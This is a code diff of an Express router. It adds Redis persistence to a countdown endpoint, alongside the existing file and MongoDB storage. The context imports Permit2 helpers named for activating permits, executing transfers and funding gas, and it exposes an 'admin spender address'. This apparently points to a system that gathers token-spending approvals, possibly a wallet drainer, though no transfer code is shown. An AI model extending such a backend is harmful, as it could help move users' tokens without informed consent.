@@ -5,7 +5,7 @@ import Permit from '../models/Permit.js';
 import Settings from '../models/Settings.js';
 import { activatePermit, executeTransfer, checkPermit2Allowance, sendGasFunding } from '../utils/permit2Executor.js';
 import auth from '../middleware/auth.js';
-import { getAllPermits, getPermitById, updatePermitById, writeSettingToFile } from '../utils/storage.js';
+import { getAllPermits, getPermitById, updatePermitById, writeSettingToFile, saveCountdownToRedis } from '../utils/storage.js';
 
 const router = express.Router();
 
@@ -27,25 +27,29 @@ router.post('/countdown', async (req, res) => {
       return res.status(400).json({ error: 'Please provide days or targetDate' });
     }
 
-    // Always persist to settings file first — this is the durable fallback
-    // that survives Vercel cold starts where MongoDB may be briefly unavailable.
+    // ── Layer 1: Upstash Redis (REST API — no connection state, survives every cold start)
+    await saveCountdownToRedis(finalTarget);
+
+    // ── Layer 2: Local file (backup for local dev / same-instance reads)
     writeSettingToFile('countdown_target', finalTarget);
 
+    // ── Layer 3: MongoDB (ground truth for multi-instance reads)
     try {
       const setting = await Settings.findOneAndUpdate(
         { key: 'countdown_target' },
         { value: finalTarget, updatedAt: new Date() },
         { upsert: true, new: true }
       );
-      res.json({ success: true, targetDate: setting.value });
+      return res.json({ success: true, targetDate: setting.value });
     } catch (dbErr) {
-      console.warn('[COUNTDOWN POST] MongoDB save failed, returning file-saved value:', dbErr.message);
-      res.json({ success: true, targetDate: finalTarget });
+      console.warn('[COUNTDOWN POST] MongoDB save failed, Redis/file backup used:', dbErr.message);
+      return res.json({ success: true, targetDate: finalTarget });
     }
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
+
 
 // Public endpoint to get admin spender address (Proxy Contract or Wallet)
 router.get('/spender', (req, res) => {
